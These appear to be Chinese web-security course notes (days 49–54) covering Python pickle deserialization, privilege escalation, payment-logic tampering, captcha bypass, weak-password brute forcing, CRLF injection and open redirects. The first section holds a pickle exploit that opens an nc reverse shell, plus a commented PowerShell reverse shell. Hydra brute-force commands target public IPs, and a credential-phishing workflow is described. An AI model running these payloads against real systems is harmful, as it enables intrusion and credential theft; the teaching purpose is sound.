<p>python反序列化不同于PHP的一点时，构造利用链时不需要网站源码含有能被自动调用的魔术方法，<br>只需要在构造利用链的时候自己调用利用链中的魔术方法即可，也就说python源码中只有要pickle.load()反序列化函数即可利用</p>
<h4 id="CTF-反序列化漏洞利用构造-RCE"><a href="#CTF-反序列化漏洞利用构造-RCE" class="headerlink" title="#CTF-反序列化漏洞利用构造&amp;RCE"></a>#CTF-反序列化漏洞利用构造&amp;RCE</h4><p>环境介绍：利用Python-ask搭建的web应用，获取当前用户的信息，进行展示，在获取用<br>户的信息时，通过对用户数据进行反序列化获取导致的安全漏洞！<br>思路：通过分析网站源代码可知，用过接收cookie中user参数的值，然后将值拼接到HELLOW 之后显示，<br>那么我们只需要构造利用链传参到cookie中user字段，即可利用<br>Server服务器：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        user = base64.b64decode(request.cookies.get(<span class="string">&#x27;user&#x27;</span>))</span><br><span class="line">        user = pickle.loads(user)</span><br><span class="line">        username = user[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        username = <span class="string">&quot;Guest&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Hello %s&quot;</span> % username</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(</span><br><span class="line">        host=<span class="string">&#x27;192.168.1.3&#x27;</span>,</span><br><span class="line">        port=<span class="number">5000</span>,</span><br><span class="line">        debug=<span class="literal">True</span></span><br><span class="line">    )</span><br></pre></td></tr></table></figure>

<p>hack-flag.py：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">exp</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment">#s = &quot;&quot;&quot;powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(&quot;192.168.46.137&quot;,6666); = .GetStream();[byte[]] = 0..65535|%&#123;0&#125;;while(( = .Read(, 0, .Length)) -ne 0)&#123;; = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(,0, ); = (iex  2&gt;&amp;1 | Out-String );  =  + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;; = ([text.encoding]::ASCII).GetBytes();.Write(,0,.Length);.Flush()&#125;;.Close()&quot;&quot;&quot;</span></span><br><span class="line">        s=<span class="string">&#x27;c:/nc -e cmd 192.168.46.137 6666&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (s,))</span><br><span class="line">e = exp()</span><br><span class="line">s = pickle.dumps(e)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"></span><br><span class="line">response = requests.get(<span class="string">&quot;http://192.168.1.3:5000/&quot;</span>, cookies=<span class="built_in">dict</span>(</span><br><span class="line">    user=base64.b64encode(s).decode()</span><br><span class="line">))</span><br><span class="line"><span class="built_in">print</span>(response.content)</span><br></pre></td></tr></table></figure>

<h4 id="CTF-华北JWT-反序列化"><a href="#CTF-华北JWT-反序列化" class="headerlink" title="#CTF-华北JWT&amp;反序列化"></a><strong>#CTF-华北JWT&amp;反序列化</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过提示-&gt;寻找lV6-&gt;购买修改支付逻辑-&gt;绕过admin限制需修改jwt值&gt;爆被jwt密匙&gt;重组</span><br><span class="line">jwt值成为admin-&gt;购买进入会员中心-&gt;源码找到文件压缩源码-&gt;Python代码审计反序列化</span><br><span class="line">&gt;构适读取f1ag代码进行序列化打印-&gt;提交获取</span><br><span class="line">考点1:JWT身份验证攻击点：</span><br><span class="line">https://www.cnblogs.com/vege/p/14468030.html</span><br><span class="line">https://github.com/ck00004/c-jwt-cracker</span><br><span class="line">考点2:Pth0n代码审计反序列化：</span><br><span class="line">自动工具：https://github.com/PyCQA/bandit</span><br><span class="line">参考资料：https://github.com/bit4woo/python_sec</span><br></pre></td></tr></table></figure>

<p>思路：根据网站提示找到lv6–使用爬虫爬取lv6</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,time</span><br><span class="line">url=<span class="string">&quot;http://45bc846d-ca58-49a6-812d-de90e99f548d.node5.buuoj.cn:81/shop?page=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">2000</span>):</span><br><span class="line">    time.sleep(<span class="number">0.2</span>)</span><br><span class="line">    r=requests.get(url+<span class="built_in">str</span>(i))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;lv6.png&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(i)+<span class="string">&#x27;|no&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><strong>绕过admin限制试图修改jwt值，但是需要对密钥进行爆破–使用工具爆破后获得密钥IKun–构造admin jwt值</strong></p>
<p>页面并无其他内容，点击也无反应–查看js代码–含有网站源代码下载</p>
<p>进行代码审计–全局查找pickle.load()函数–找到反序列化位置，构造利用链</p>
<h4 id="代码审计-自动化工具band安装及使用"><a href="#代码审计-自动化工具band安装及使用" class="headerlink" title="#代码审计-自动化工具band安装及使用"></a>#代码审计-自动化工具band安装及使用</h4><p>参考：<a href="https://bandit.readthedocs.lo/">https://bandit.readthedocs.lo/</a><br>安装：pip install bandit<br>linux：<br>安装后会在当前Python目录下6in<br>使用：bandit-r需要审计的源码目录<br>windows：<br>安装后会在当前Python目录下script<br>使用：bandit-r需要审计的源码目录</p>
<h1 id="第49天：WEB攻防-通用漏洞-业务逻辑-水平垂直越权-访问控制-脆弱验证"><a href="#第49天：WEB攻防-通用漏洞-业务逻辑-水平垂直越权-访问控制-脆弱验证" class="headerlink" title="第49天：WEB攻防-通用漏洞&amp;业务逻辑&amp;水平垂直越权&amp;访问控制&amp;脆弱验证"></a>第49天：WEB攻防-通用漏洞&amp;业务逻辑&amp;水平垂直越权&amp;访问控制&amp;脆弱验证</h1><h4 id="知识点：-29"><a href="#知识点：-29" class="headerlink" title="知识点："></a>知识点：</h4><p>1、水平越权同级用户权限共享<br>2、垂直越权-低高用户权限共享<br>3、访问控制-验证丢失&amp;取消验证<br>4、脆弱验证-Cookie&amp;Token&amp;Jwt等</p>
<h4 id="前置知识：-2"><a href="#前置知识：-2" class="headerlink" title="#前置知识："></a>#前置知识：</h4><p>1、逻辑越权原理<br>水平越权：用户信息获取时未对用户与D比较判断直接查间等<br>垂直越权：数摆库中用户类型编号接受缥改或高权限操作未验证等<br>2、访问控制原理<br>验证丢失：未包含引用验证代码文件等<br>取消验证：支持空口令，匿名白名单等<br>3、脆弱验证原理<br>-Cookie&amp;Token&amp;JwM:不安全的验证迈指等</p>
<h4 id="演示案例：-26"><a href="#演示案例：-26" class="headerlink" title="演示案例："></a>演示案例：</h4><p>权限-水平越权YXCMS-检测数据比对弱<br>权限-垂直越权-MINICMS-权限操作无验证<br>未授权-访问控制-XHCMS-代码未引用验证<br>未授权-脆弱机制-XHCMS-Cookie脆弱验证<br>弱机制-空口令机制-Redis&amp;Weblogics弱机制<br>检测类-工具项目-Authz&amp;Secscan-Authcheck</p>
<h4 id="权限-水平越权-YXCMS检溪数据比对弱"><a href="#权限-水平越权-YXCMS检溪数据比对弱" class="headerlink" title="#权限-水平越权-YXCMS检溪数据比对弱"></a><strong>#权限-水平越权-YXCMS检溪数据比对弱</strong></h4><p>只检测用户和ID对应关系，没检测当前操作用户是不是当前用户<br>思路：通过抓取对某一用户修改资料数据包进行修改–修改为其他用户且变更资料来实现</p>
<h4 id="权限-垂直越权MINICMS权限操作无验证"><a href="#权限-垂直越权MINICMS权限操作无验证" class="headerlink" title="#权限-垂直越权MINICMS权限操作无验证"></a><strong>#权限-垂直越权MINICMS权限操作无验证</strong></h4><p>后台数据包访问先执行后判断登录等于无效</p>
<h4 id="未授权-脆弱机制-XHCMS-Cookie脆弱验证"><a href="#未授权-脆弱机制-XHCMS-Cookie脆弱验证" class="headerlink" title="#未授权-脆弱机制-XHCMS-Cookie脆弱验证"></a>#<strong>未授权-脆弱机制-XHCMS-Cookie脆弱验证</strong></h4><p>修改数据包中cookie字段信息，构造user等于任意字段直接登录到后台。</p>
<h4 id="弱机制-空口令机制-Redis-Weblogics弱机制"><a href="#弱机制-空口令机制-Redis-Weblogics弱机制" class="headerlink" title="#弱机制-空口令机制-Redis&amp;Weblogics弱机制"></a>#<strong>弱机制-空口令机制-Redis&amp;Weblogics弱机制</strong></h4><p>redis直接使用redis-cli.exe连接<br>wenlogic访问特定url</p>
<h4 id="检测类-工具项目-Authz-Secscan-Authcheck"><a href="#检测类-工具项目-Authz-Secscan-Authcheck" class="headerlink" title="#检测类-工具项目-Authz&amp;Secscan-Authcheck"></a>#检测类-工具项目-Authz&amp;Secscan-Authcheck</h4><p>安装踩坑：<a href="https://bigyoung.cn/posts/250/">https://bigyoung.cn/posts/250/</a><br><a href="https://github.com/ztosec/secscan-authcheck">https://github.com/ztosec/secscan-authcheck</a>     越权检测工具</p>
<p><a href="https://blog.csdn.net/weixin_44203158/article/details/110007233">https://blog.csdn.net/weixin_44203158/article/details/110007233</a></p>
<h1 id="第50天：WEB攻防-通用漏洞-购买支付逻辑-数据篡改-请求重放-接口替换"><a href="#第50天：WEB攻防-通用漏洞-购买支付逻辑-数据篡改-请求重放-接口替换" class="headerlink" title="第50天：WEB攻防-通用漏洞&amp;购买支付逻辑&amp;数据篡改&amp;请求重放&amp;接口替换"></a>第50天：WEB攻防-通用漏洞&amp;购买支付逻辑&amp;数据篡改&amp;请求重放&amp;接口替换</h1><h4 id="知识点：-30"><a href="#知识点：-30" class="headerlink" title="知识点："></a>知识点：</h4><p>1、商品购买数量&amp;价格&amp;编号等<br>2、支付模式状态&amp;接口&amp;负数等<br>3、折扣处理-优患券&amp;积分&amp;重放等</p>
<h4 id="详细点：-10"><a href="#详细点：-10" class="headerlink" title="#详细点："></a>#详细点：</h4><p>1、熟悉常见支付流程<br>选择商品和数量选择译支付及配送方式生成订单编号订单支付选择完成支付<br>2、熟悉那些数据算改<br>商品编号引D,购买价格，购买数量，支付方式，订单号，支付状态等<br>3、熟悉那些修改方式<br>替换支付，重复支付，最小额支付，负数支付，溢出支付，优患券支付等</p>
<h4 id="章节内容："><a href="#章节内容：" class="headerlink" title="#章节内容："></a>#章节内容：</h4><p>1、权限相关越权&amp;访问控制&amp;未授权访问等<br>2、购买支付数据算改&amp;支付模式&amp;其他折扣等<br>3、下节课<br>4、下节课</p>
<h4 id="演示案例：-27"><a href="#演示案例：-27" class="headerlink" title="演示案例："></a>演示案例：</h4><p> 数据篡改-价格&amp;数量&amp;产品</p>
<p> 修改方式-订单号&amp;数量&amp;优惠券</p>
<p> 某实例-演示站交易支付逻辑安全</p>
<p> 代码审计-业务支付逻辑&amp;安全修复</p>
<h4 id="数据篡改-价格-数量-产品"><a href="#数据篡改-价格-数量-产品" class="headerlink" title="#数据篡改-价格&amp;数量&amp;产品"></a>#数据篡改-价格&amp;数量&amp;产品</h4><p>1、修改数量达到价格变动</p>
<p>因为没有把这些参数固定死，导致出现的安全问题</p>
<p>2、修改单价达到价格变动</p>
<p>3、修改产品达到低价购买（A产品5400 B产品6000,通过将A产品数据包中除价格外内容修改为B产品）</p>
<p>当不能对数量和价格做修改的时候的另一种做法。</p>
<p>4、修改接口达到成功购买</p>
<blockquote>
<p>修改支付接口，抓包可以看到这一系列参数就是代表的支付宝接口，如果说你把这个改成你自己的支付接口的话，就像行当与你把钱付给自己。然后支付状态也没问题的话，对方就会认为成功支付了。但是这个支付接口是比较难申请的，因为关联一些洗钱相关的黑色产业，所以抓的比较紧，并且也是违法行为。这里不做演示，知道有这个东西就好。</p>
<p>这是一个攻击点，但防御也很简单，就是对方不认你这个接口，它直接在源码中写清楚只接受自己的接口，所以就算你改成功了，并且也付款成功了。对方那里就会显示购买失败。</p>
</blockquote>
<h4 id="修改方式-订单号-数量-优惠券"><a href="#修改方式-订单号-数量-优惠券" class="headerlink" title="#修改方式-订单号&amp;数量&amp;优惠券"></a>#修改方式-订单号&amp;数量&amp;优惠券</h4><p>1、修改数量达到价格变动（数量修改为0.001）</p>
<p>2、修改订单达到底价购买（修改订单编号，比如有100和1000000的两个单，修改编号使用100去购买1000000的单）</p>
<p>3、优惠券重放使用&amp;重领使用</p>
<h4 id="某实例-演示站交易支付逻辑安全"><a href="#某实例-演示站交易支付逻辑安全" class="headerlink" title="#某实例-演示站交易支付逻辑安全"></a>#某实例-演示站交易支付逻辑安全</h4><p>奇乐中介–修改订单金额</p>
<h4 id="代码审计-业务支付逻辑-安全修复"><a href="#代码审计-业务支付逻辑-安全修复" class="headerlink" title="#代码审计-业务支付逻辑&amp;安全修复"></a>#代码审计-业务支付逻辑&amp;安全修复</h4><p>1、金额以数据库定义为准</p>
<p>2、购买数量限制为正整数</p>
<p>3、优惠券固定使用后删除</p>
<p>4、订单生成后检测对应值</p>
<h1 id="第51天：WEB攻防-通用漏洞-验证码识别-复用-调用-找回密码重定向-状态值"><a href="#第51天：WEB攻防-通用漏洞-验证码识别-复用-调用-找回密码重定向-状态值" class="headerlink" title="第51天：WEB攻防-通用漏洞&amp;验证码识别&amp;复用&amp;调用&amp;找回密码重定向&amp;状态值"></a>第51天：WEB攻防-通用漏洞&amp;验证码识别&amp;复用&amp;调用&amp;找回密码重定向&amp;状态值</h1><h4 id="知识点：-31"><a href="#知识点：-31" class="headerlink" title="#知识点："></a>#知识点：</h4><p>1、找回密码逻辑机制-回显&amp;验证码&amp;指向</p>
<p>2、验证码验证安全机制-爆破&amp;复用&amp;识别</p>
<p>3、找回密码-客户端回显&amp;Response 状态值&amp;修改重定向</p>
<p>4、验证码技术-验证码爆破，验证码复用，验证码识别等</p>
<h4 id="详细点：-11"><a href="#详细点：-11" class="headerlink" title="#详细点："></a>#详细点：</h4><p>-找回密码流程安全：</p>
<p>1、用回显状态判断-res 前端判断不安全</p>
<p>2、用用户名重定向-修改标示绕过验证</p>
<p>3、验证码回显显示-验证码泄漏验证虚设</p>
<p>4、验证码简单机制-验证码过于简单爆破</p>
<p>-验证码绕过安全：</p>
<p>1、验证码简单机制-验证码过于简单爆破</p>
<p>2、验证码重复使用-验证码验证机制绕过</p>
<p>3、验证码智能识别-验证码图形码被识别</p>
<p>4、验证码接口调用-验证码触发机制枚举</p>
<h4 id="安全修复方案："><a href="#安全修复方案：" class="headerlink" title="#安全修复方案："></a>#安全修复方案：</h4><p>-找回机制要进行每一步验证-防绕过重定向</p>
<p>-找回机制要进行服务端验证-防 res 数据修改</p>
<p>-找回机制要控制验证码安全-防验证码攻击</p>
<p>-验证码接口需验证后被调用-防接口被乱调用</p>
<p>-验证码引用智能化人工判断-防验证码被识别</p>
<p>-验证码采用时间段生效失效-防验证码被复用</p>
<h4 id="演示案例：-28"><a href="#演示案例：-28" class="headerlink" title="演示案例："></a>演示案例：</h4><p>phpun-res 值修改&amp;验证码回显&amp;爆破</p>
<p>某 APP-res 值修改&amp;验证码接口调用&amp;复用</p>
<p>seacms-验证码识别&amp;找回机制对应值修改</p>
<h4 id="phpun-res-值修改-验证码回显-爆破"><a href="#phpun-res-值修改-验证码回显-爆破" class="headerlink" title="#phpun-res 值修改&amp;验证码回显&amp;爆破"></a>#phpun-res 值修改&amp;验证码回显&amp;爆破</h4><p>1、验证码回显绑定手机号时验证码前端泄漏被获取<br>在提交验证码时，请求包中含有正确的验证码，<br>此时只需要把提交表单中的验证码改为正确的即可绕过。</p>
<p>2、res修改-绑定手机号时修改返回状态值判定通过<br>将浏览器返回给浏览器的数据抓包（通过burp response this request）发现验证正确的数据包返回值为1，验证错误的数据包返回值为3，所以修改返回值为1即可绕过</p>
<p>3、验证码爆破知道验证码规矩进行无次数限制爆破（建立在验证码没错误次数限制的基础上）<br>使用brup自带的爆破模块（不实用）</p>
<h4 id="某-APP-res-值修改-验证码接口调用-复用"><a href="#某-APP-res-值修改-验证码接口调用-复用" class="headerlink" title="#某 APP-res 值修改&amp;验证码接口调用&amp;复用"></a>#某 APP-res 值修改&amp;验证码接口调用&amp;复用</h4><p>res 修改-找回密码修改返回状态值判定验证通过</p>
<p>验证码接口调用-抓当前发送验证码数据包后调用</p>
<p>思路：先尝试发送验证码验证请求包–抓包并未看到正确验证码存在–尝试抓取验证正确返回包和验证错误返回包，然后将错误返回包内容替换为正确表单值–成功绕过</p>
<p>验证码复用-抓第一次验证通过的验证码进行复用</p>
<h4 id="seacms-验证码识别-找回机制对应值修改"><a href="#seacms-验证码识别-找回机制对应值修改" class="headerlink" title="#seacms-验证码识别&amp;找回机制对应值修改"></a>#seacms-验证码识别&amp;找回机制对应值修改</h4><p>-找回机制对应值修改：</p>
<p>注册两个帐号，尝试找回密码，重置连接重定向绕过</p>
<p>代码审计后分析 Poc：</p>
<p>member.php?mod&#x3D;repsw3&amp;repswcode&#x3D;y&amp;repswname&#x3D;targetUser</p>
<p>-验证码识别：xp_CAPTCHA</p>
<p><a href="https://github.com/c0ny1/captcha-killer">https://github.com/c0ny1/captcha-killer</a></p>
<p><a href="https://github.com/smxiazi/NEW_xp_CAPTCHA">https://github.com/smxiazi/NEW_xp_CAPTCHA</a></p>
<p>使用环境：windows 10 python3.6.5</p>
<p>安装使用：具体看直播操作</p>
<p>1、burp 安装 jypython 后导入 py 文件</p>
<p>2、安装所需库后 python 运行 server.py</p>
<p>3、抓操作数据包后设置参数设置引用</p>
<p>参考案例：<a href="https://www.cnblogs.com/punished/p/14746970.html">https://www.cnblogs.com/punished/p/14746970.html</a></p>
<p>应用：爆破密码时，接口调用时，测试其他时等</p>
<p>验证码识别详见文章：<a href="https://blog.csdn.net/qq_46343633/article/details/128378686">Brup+Captcha-killer+ddddocr实现验证码识别</a></p>
<h1 id="第52天：WEB攻防-通用漏洞-弱口令安全-社工字典生成-服务协议-Web应用"><a href="#第52天：WEB攻防-通用漏洞-弱口令安全-社工字典生成-服务协议-Web应用" class="headerlink" title="第52天：WEB攻防-通用漏洞&amp;弱口令安全&amp;社工字典生成&amp;服务协议&amp;Web应用"></a>第52天：WEB攻防-通用漏洞&amp;弱口令安全&amp;社工字典生成&amp;服务协议&amp;Web应用</h1><h4 id="知识点：-32"><a href="#知识点：-32" class="headerlink" title="#知识点："></a>#知识点：</h4><p>1、弱口令安全&amp;配置&amp;初始化等</p>
<p>2、弱口令对象&amp;Web&amp;服务&amp;应用等</p>
<p>3、弱口令字典&amp;查询&amp;列表&amp;列表等</p>
<h4 id="前置知识：-3"><a href="#前置知识：-3" class="headerlink" title="#前置知识："></a>#前置知识：</h4><p>弱口令(weak password) 没有严格和准确的定义，通常认为容易被别人（他们有可能</p>
<p>对你很了解）猜测到或被破解工具破解的口令均为弱口令，通常与管理的安全意识和平台</p>
<p>的初始化配置等相关，通过系统弱口令，可被黑客直接获得系统控制权限。</p>
<p>在常见的安全测试中，弱口令会产生安全的各个领域，包括 Web 应用，安全设备，平台</p>
<p>组件，操作系统等；如何获取弱口令，利用弱口令成为了此类安全问题的关键！</p>
<h4 id="演示案例：-29"><a href="#演示案例：-29" class="headerlink" title="演示案例："></a>演示案例：</h4><p> Web 类-加密&amp;验证码后台猜解</p>
<p> 服务类-SSH&amp;RDP 远程终端猜解</p>
<p> 应用类-ZIP&amp;Word 文件压缩包猜解</p>
<p> 字典类-密文收集&amp;弱口令&amp;自定义生成</p>
<h4 id="Web-类-加密-验证码后台猜解"><a href="#Web-类-加密-验证码后台猜解" class="headerlink" title="#Web 类-加密&amp;验证码后台猜解"></a>#Web 类-加密&amp;验证码后台猜解</h4><p><a href="https://github.com/smxiazi/NEW_xp_CAPTCHA">https://github.com/smxiazi/NEW_xp_CAPTCHA</a></p>
<p>-Zblog-密文 MD5 传输加密猜解</p>
<p>Seacms-登录验证码识别猜解（识别验证码识别工具绕过验证码认证）</p>
<h4 id="服务类–SSH-RDP远程终端猜解"><a href="#服务类–SSH-RDP远程终端猜解" class="headerlink" title="#服务类–SSH&amp;RDP远程终端猜解"></a><strong>#服务类–SSH&amp;RDP远程终端猜解</strong></h4><p><a href="https://github.com/vanhauser-thc/thc-hydra">https://github.com/vanhauser-thc/thc-hydra</a><br>hydra是一个自动化的爆破工具，暴力破解弱密码<br>是一个支持众多协议的爆破工具，已经集成到KaliLinux中，直接在终端打开即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-s PORT可通过这个参数指定非默认端口，</span><br><span class="line">-i LOGN指定破解的用户，对特定用户破解。</span><br><span class="line">-L FILE指定用户名字典。</span><br><span class="line">-p PASS小写，指定密码破解，少用，一股是采用密码序典。</span><br><span class="line">-P FILE大写，指定密码字典。</span><br><span class="line">-e ns可选选项，n:空密码试探，s:使用指定用户和密码试探。</span><br><span class="line">-C FILE使用冒号分割格式，例如“登录名：密码&quot;来代蕾LU-P参数。</span><br><span class="line">-M FILE指定目标列表文件一行一条。</span><br><span class="line">-o FILE指定结果输出文件。</span><br><span class="line">-f 在使用-M参数以后，找到第一对登录名或者密码的时候中止破解。</span><br><span class="line">-t  TASKS同时运行的线程数，默认为16.</span><br><span class="line">-w TIME设置最大超时的时间，单位秒，默认是30s.</span><br><span class="line">-v /-V显示详细过程。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -I root -P UserPassCombo-Jay.txt -t 5-WV 47.110.73.12 ssh -f</span><br><span class="line">hydra -I administrator-P UserPassCombo-Jay.txt -t 5-WV 47.99.218.105 rdp -f</span><br></pre></td></tr></table></figure>

<h4 id="应用类-ZIP-WORD文件压缩包猜解"><a href="#应用类-ZIP-WORD文件压缩包猜解" class="headerlink" title="#应用类-ZIP&amp;WORD文件压缩包猜解"></a><strong>#应用类-ZIP&amp;WORD文件压缩包猜解</strong></h4><p>PassFab for Word<br>Advanced Archive Password Recovery</p>
<h4 id="字典类密文收美-弱口令-自定义生成"><a href="#字典类密文收美-弱口令-自定义生成" class="headerlink" title="#字典类密文收美&amp;弱口令&amp;自定义生成"></a>#字典类密文收美&amp;弱口令&amp;自定义生成</h4><p><a href="https://monitor.firefox.com/">https://monitor.firefox.com</a><br><a href="https://haveibeenpwned.com/">https://haveibeenpwned.com</a><br><a href="https://www.bugku.com/mima">https://www.bugku.com/mima</a><br><a href="https://github.com/danielmiessler/SecLists%EF%BC%88%E8%BF%91%E5%87%A0%E5%B9%B4%E5%AF%86%E7%A0%81%E4%B9%A0%E6%83%AF%EF%BC%89">https://github.com/danielmiessler/SecLists（近几年密码习惯）</a><br><a href="https://github.com/hetianlab/DefaultCreds-cheat-sheet%EF%BC%88%E5%B8%B8%E8%A7%81%E8%AE%BE%E5%A4%87%E5%AF%86%E7%A0%81%EF%BC%89">https://github.com/hetianlab/DefaultCreds-cheat-sheet（常见设备密码）</a></p>
<h1 id="第53天：WEB攻防-通用漏洞-CRLF注入-URL重定向-资源处理拒绝服务"><a href="#第53天：WEB攻防-通用漏洞-CRLF注入-URL重定向-资源处理拒绝服务" class="headerlink" title="第53天：WEB攻防-通用漏洞&amp;CRLF注入&amp;URL重定向&amp;资源处理拒绝服务"></a>第53天：WEB攻防-通用漏洞&amp;CRLF注入&amp;URL重定向&amp;资源处理拒绝服务</h1><h4 id="知识点：-33"><a href="#知识点：-33" class="headerlink" title="#知识点："></a>#知识点：</h4><p>1、CRLF 注入-原理&amp;检测&amp;利用</p>
<p>2、URL 重定向-原理&amp;检测&amp;利用</p>
<p>3、Web 拒绝服务-原理&amp;检测&amp;利用</p>
<h4 id="下节预告："><a href="#下节预告：" class="headerlink" title="#下节预告："></a>#下节预告：</h4><p>1、JSONP&amp;CORS 跨域</p>
<p>2、域名安全-接管劫持</p>
<h4 id="详细点：-12"><a href="#详细点：-12" class="headerlink" title="#详细点："></a>#详细点：</h4><h6 id="1-CRLF-注入漏洞，是因为-Web-应用没有对用户输入做严格验证，导致攻击者可以输入一"><a href="#1-CRLF-注入漏洞，是因为-Web-应用没有对用户输入做严格验证，导致攻击者可以输入一" class="headerlink" title="1.CRLF 注入漏洞，是因为 Web 应用没有对用户输入做严格验证，导致攻击者可以输入一"></a>1.CRLF 注入漏洞，是因为 Web 应用没有对用户输入做严格验证，导致攻击者可以输入一</h6><p>些恶意字符。攻击者一旦向请求行或首部中的字段注入恶意的 CRLF，就能注入一些首部</p>
<p>字段或报文主体，并在响应中输出，所以又称为 HTTP 响应拆分漏洞。</p>
<p>如何检测安全问题：CRLFuzz</p>
<h6 id="2-URL-重定向跳转"><a href="#2-URL-重定向跳转" class="headerlink" title="2.URL 重定向跳转"></a>2.URL 重定向跳转</h6><p>写代码时没有考虑过任意 URL 跳转漏洞，或者根本不知道&#x2F;不认为这是个漏洞;</p>
<p>写代码时考虑不周,用取子串、取后缀等方法简单判断，代码逻辑可被绕过;</p>
<p>对传入参数做一些奇葩的操作(域名剪切&#x2F;拼接&#x2F;重组)和判断，适得其反，反被绕过; </p>
<p>原始语言自带的解析 URL、判断域名的函数库出现逻辑漏洞或者意外特性,可被绕过;</p>
<p>原始语言、服务器&#x2F;容器特性、浏览器等对标准 URL 协议解析处理等差异性导致绕过;</p>
<h6 id="3-Web-拒绝服务"><a href="#3-Web-拒绝服务" class="headerlink" title="3.Web 拒绝服务"></a>3.Web 拒绝服务</h6><p>现在有许多资源是由服务器生成然后返回给客户端的，而此类“资源生成”接口如若有参数</p>
<p>可以被客户端控制（可控），并没有做任何资源生成大小限制，这样就会造成拒绝服务风</p>
<p>险，导致服务器处理不过来或占用资源去处理。</p>
<h4 id="演示案例：-30"><a href="#演示案例：-30" class="headerlink" title="演示案例："></a>演示案例：</h4><p>CRLF注入-原理&amp;检测&amp;利用<br>URL重定向-原理&amp;检&amp;利用<br>WEB拒绝服务-原理&amp;检测&amp;利用</p>
<h4 id="案例1-CRLF注入原理-检测-利用"><a href="#案例1-CRLF注入原理-检测-利用" class="headerlink" title="#案例1-CRLF注入原理&amp;检测&amp;利用"></a>#案例1-CRLF注入原理&amp;检测&amp;利用</h4><p>vulhub nginx</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%0aSet-cookie:JSPSESSID%3Ddrops</span><br><span class="line">url=%0d%0a%0d%0a&lt;img src=1 onerror=alert(/xss/)&gt;/</span><br><span class="line">CRLFuzz:https:.//github.com/dwisiswanto/crlfuzz/releases</span><br></pre></td></tr></table></figure>

<p>设置cookie值</p>
<p>配合xss弹窗.</p>
<h4 id="案例2-URL重定向-原理-检测-利用"><a href="#案例2-URL重定向-原理-检测-利用" class="headerlink" title="#案例2-URL重定向&amp;原理&amp;检测&amp;利用"></a>#案例2-URL重定向&amp;原理&amp;检测&amp;利用</h4><p><a href="http://xxx/zb_system/login.php?url=http://www.xiaodi8.com/zb_system/login.php">http://xxx/zb_system/login.php?url=http://www.xiaodi8.com/zb_system/login.php</a><br>大概意思是讲重定向漏洞的危害：网站接受用户输入的链接，跳转到一个攻击者控制的网<br>站，可能得致跳转过去的用户被精心设置的钓鱼贡面骗走自己的个人信层和登录口令。国<br>外大厂的一个任意URL跳转都500S、1000S了，国内看运气~<br>业务：<br>用户登录、统一身份分认证处，认证完后跳转<br>用户分孚、收意内容过后，会跳转<br>跨站点认证、授权后，会跳转<br>站内点击其它网址链接时，会跳转</p>
<p>钓鱼思路：找到含有url重定向漏洞的网站–保存到本地–修改本地html为php文件然后写入两个接收用户名和密码的变量，把变量传给网站同目录下x.php–x.php用来接收变量用户名和密码–受害者访问伪造好的链接输入用户名密码–密码传给x.php–写入本地user.txt</p>
<h4 id="案例3-WEB拒绝服务-原理-检测-利用"><a href="#案例3-WEB拒绝服务-原理-检测-利用" class="headerlink" title="案例3-WEB拒绝服务-原理&amp;检测&amp;利用"></a>案例3-WEB拒绝服务-原理&amp;检测&amp;利用</h4><p>1、验证码或图片显示自定义大小<br>2、上传压缩包解压循环资源占用</p>
<h1 id="第54天-WEB攻防-通用漏洞-跨域CORS资源-JSONP回调-域名接管劫持"><a href="#第54天-WEB攻防-通用漏洞-跨域CORS资源-JSONP回调-域名接管劫持" class="headerlink" title="第54天 WEB攻防-通用漏洞&amp;跨域CORS资源&amp;JSONP回调&amp;域名接管劫持"></a>第54天 WEB攻防-通用漏洞&amp;跨域CORS资源&amp;JSONP回调&amp;域名接管劫持</h1><h4 id="知识点：-34"><a href="#知识点：-34" class="headerlink" title="知识点："></a>知识点：</h4><p>1、子域名接管检测&amp;探针&amp;利用<br>2、C0SP跨域资源检测&amp;探针&amp;利用<br>3、JSONP跨域回调-检侧&amp;探针&amp;利用</p>
